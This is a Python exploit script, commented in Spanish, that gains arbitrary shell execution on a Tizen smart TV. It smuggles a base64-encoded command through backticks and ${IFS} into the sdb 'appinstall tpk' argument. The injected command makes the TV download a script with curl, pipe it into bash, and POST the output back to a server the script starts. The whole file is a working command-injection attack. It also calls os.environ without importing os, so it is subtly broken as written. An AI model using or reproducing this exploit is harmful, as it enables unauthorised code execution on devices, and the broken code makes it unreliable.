#!/usr/bin/env python3
"""
tv-exec.py — ejecuta un script shell arbitrario en la TV (UID 901/sdk).

Canal: `0 appinstall tpk` admite backticks sin espacios (${IFS}) que la shell
del TV expande — técnica documentada por CleanFrame y couchroot/S90D.
La TV descarga el script con curl y devuelve la salida con curl POST.
La salida del propio `sdb shell` con backticks es siempre "closed" (async):
no sirve como indicador de éxito; el resultado es lo que llegue por POST.

Uso: tv-exec.py <script.sh> [timeout]
"""
import socket, subprocess, sys, threading, uuid
from pathlib import Path

TV_IP = os.environ.get("ARN0_TV_IP", "192.168.1.128")  # export ARN0_TV_IP=<tu TV>
SDB = str(Path(__file__).resolve().parent / "sdb-run.sh")   # wrapper docker
SERIAL = "host.docker.internal:26101"

def sdb(args, timeout=15):
    return subprocess.run([SDB, *args], capture_output=True, text=True, timeout=timeout)

def main():
    script = Path(sys.argv[1]).resolve().read_bytes()
    timeout = int(sys.argv[2]) if len(sys.argv) > 2 else 30
    token = uuid.uuid4().hex[:8]

    r = sdb(["connect", SERIAL])
    if "connected" not in (r.stdout + r.stderr) and "already" not in (r.stdout + r.stderr):
        print(f"AVISO connect: {r.stdout.strip()} {r.stderr.strip()}", file=sys.stderr)

    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as rt:
        rt.connect((TV_IP, 9)); local = rt.getsockname()[0]

    state = {"script_served": False, "out": bytearray()}
    result = threading.Event()

    class H(socketserver.BaseHTTPRequestHandler if False else __import__("http.server", fromlist=["BaseHTTPRequestHandler"]).BaseHTTPRequestHandler):
        def _common(self):
            try:
                if self.command == "GET" and self.path.endswith("/in") and not state["script_served"]:
                    state["script_served"] = True
                    self.send_response(200)
                    self.send_header("Content-Length", str(len(script)))
                    self.end_headers()
                    self.wfile.write(script)
                elif self.command == "POST" and self.path.endswith("/out"):
                    length = int(self.headers.get("Content-Length", 0))
                    state["out"] += self.rfile.read(length)
                    self.send_response(200); self.send_header("Content-Length", "2"); self.end_headers(); self.wfile.write(b"ok")
                    result.set()
                else:
                    self.send_response(404); self.send_header("Content-Length", "0"); self.end_headers()
            except Exception:
                pass
        do_GET = _common; do_POST = _common
        def log_message(self, *a): pass

    import http.server, socketserver
    socketserver.ThreadingTCPServer.allow_reuse_address = True
    with socketserver.ThreadingTCPServer((local, 0), H) as srv:
        port = srv.server_address[1]
        t = threading.Thread(target=srv.serve_forever, daemon=True); t.start()

        base = f"http://{local}:{port}"
        inline = (f"curl${{IFS}}-s${{IFS}}{base}/in"
                  f"|bash"
                  f"|curl${{IFS}}-s${{IFS}}-X${{IFS}}POST${{IFS}}--data-binary${{IFS}}@-${{IFS}}{base}/out")
        import base64
        enc = base64.b64encode(inline.encode()).decode()
        argument = "0 appinstall tpk new2.tpk`printf${IFS}%s${IFS}" + enc + "|base64${IFS}-d|bash`.tpk"
        if len(argument.encode()) > 400:
            sys.exit(f"Comando {len(argument)}B > 400B; no se ejecuta.")
        proc = subprocess.Popen([SDB, "-s", SERIAL, "shell", argument],
                                stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        got = result.wait(timeout)
        if proc.poll() is None: proc.terminate()
        srv.shutdown()
        if not got:
            sys.exit("SIN CALLBACK (la TV no descargó ni devolvió nada)")
        print(state["out"].decode(errors="replace"))
        sys.exit(0 if state["out"].strip() else 3)

if __name__ == "__main__":
    main()
